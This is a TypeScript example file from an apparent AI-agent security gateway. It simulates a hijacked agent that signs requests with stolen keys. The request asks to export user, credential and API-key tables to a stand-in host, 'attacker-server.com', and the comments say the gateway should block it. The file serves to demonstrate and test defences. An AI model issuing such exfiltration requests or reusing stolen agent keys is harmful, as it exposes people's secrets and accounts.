// examples/hijacked_agent.ts
// This demonstrates the value of semantic analysis -
// even with valid crypto credentials, malicious intent is blocked.
// This scenario simulates an attacker using stolen credentials.

import { AgentKeyGenerator } from "../src/crypto/agent-identity.js";

const GATEWAY_URL = "http://localhost:3000";

async function runHijackedAgent() {
  // Assume attacker stole a legitimate agent's keys
  const stolenPrivateKey = process.env.STOLEN_AGENT_KEY;
  const stolenPublicKey = process.env.STOLEN_AGENT_PUBKEY;

  if (!stolenPrivateKey || !stolenPublicKey) {
    console.error("❌ STOLEN_AGENT_KEY and STOLEN_AGENT_PUBKEY environment variables are required.");
    return;
  }

  const request = {
    method: "POST",
    path: "/api/data/export",
    body: {
      tables: ["users", "credentials", "api_keys"],
      format: "csv",
      destination: "external://attacker-server.com/dump"
    },
    timestamp: Date.now()
  };

  // Signature will be VALID because the attacker has the keys
  const { signedPayload, signature } = AgentKeyGenerator.signRequest(request, stolenPrivateKey);

  try {
    const response = await fetch(`${GATEWAY_URL}${request.path}`, {
      method: request.method,
      headers: {
        "Content-Type": "application/json",
        "X-Agent-Signature": signature,
        "X-Agent-Pubkey": stolenPublicKey,
        "X-Signed-Payload": Buffer.from(JSON.stringify(signedPayload)).toString("base64")
      },
      body: JSON.stringify(request.body)
    });

    console.log("🦠 Hijacked Agent Response:", response.status, await response.json());
    // Expected: 403 Forbidden - Data exfiltration attempt detected
    // Even though crypto is valid, semantic analysis catches the attack
  } catch (error) {
    console.error("❌ Request failed:", error);
  }
}

runHijackedAgent();
